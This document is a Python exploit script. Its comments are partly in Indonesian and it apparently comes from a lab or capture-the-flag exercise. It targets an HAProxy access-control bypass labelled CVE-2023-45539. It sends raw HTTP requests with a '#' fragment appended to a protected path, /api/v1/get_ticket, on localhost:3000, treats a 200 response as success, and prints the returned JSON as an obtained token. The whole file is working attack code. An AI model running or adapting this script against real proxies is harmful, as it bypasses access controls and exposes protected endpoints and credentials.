#!/usr/bin/env python3
"""
Raw HTTP Request Testing for HAProxy CVE-2023-45539
"""
import socket
import time

def send_raw_http_request(host, port, request):
    """Send raw HTTP request"""
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Send raw HTTP request
        sock.send(request.encode())
        
        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response and b"Content-Length: 0" in response:
                    break
                if len(response) > 10000:  # Prevent infinite reading
                    break
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='ignore')
        
    except Exception as e:
        return f"Error: {e}"

def test_haproxy_bypass():
    """Test HAProxy bypass dengan raw HTTP request"""
    
    print("🔍 Testing HAProxy CVE-2023-45539 with raw HTTP requests...\n")
    
    # Test cases untuk HAProxy fragment bypass
    test_cases = [
        {
            "name": "Standard GET with fragment",
            "request": "GET /api/v1/get_ticket# HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
        },
        {
            "name": "GET with fragment and path",
            "request": "GET /api/v1/get_ticket#/test HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
        },
        {
            "name": "GET with query and fragment", 
            "request": "GET /api/v1/get_ticket?test=1# HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
        },
        {
            "name": "GET normal (should be blocked)",
            "request": "GET /api/v1/get_ticket HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
        }
    ]
    
    for i, test in enumerate(test_cases, 1):
        print(f"[{i}] {test['name']}")
        print(f"    Request: {repr(test['request'])}")
        
        response = send_raw_http_request('localhost', 3000, test['request'])
        
        # Parse response
        lines = response.split('\n')
        status_line = lines[0] if lines else "No response"
        
        print(f"    Response: {status_line}")
        
        # Check for success
        if "200 OK" in status_line:
            print("    ✅ SUCCESS! HAProxy bypass worked!")
            # Extract JSON response
            if '{"' in response:
                json_start = response.find('{"')
                json_response = response[json_start:].strip()
                print(f"    JSON: {json_response}")
                return json_response
        elif "403" in status_line:
            print("    ❌ Blocked by HAProxy")
        else:
            print(f"    ⚠️  Unexpected response: {status_line}")
        
        print()
        time.sleep(0.5)
    
    return None

if __name__ == "__main__":
    result = test_haproxy_bypass()
    
    if result:
        print(f"\n🎉 HAProxy bypass successful!")
        print(f"Token obtained: {result}")
    else:
        print(f"\n💥 HAProxy bypass failed")
        print("This might indicate:")
        print("1. HAProxy version is patched")
        print("2. Configuration is different")
        print("3. Network/routing issue")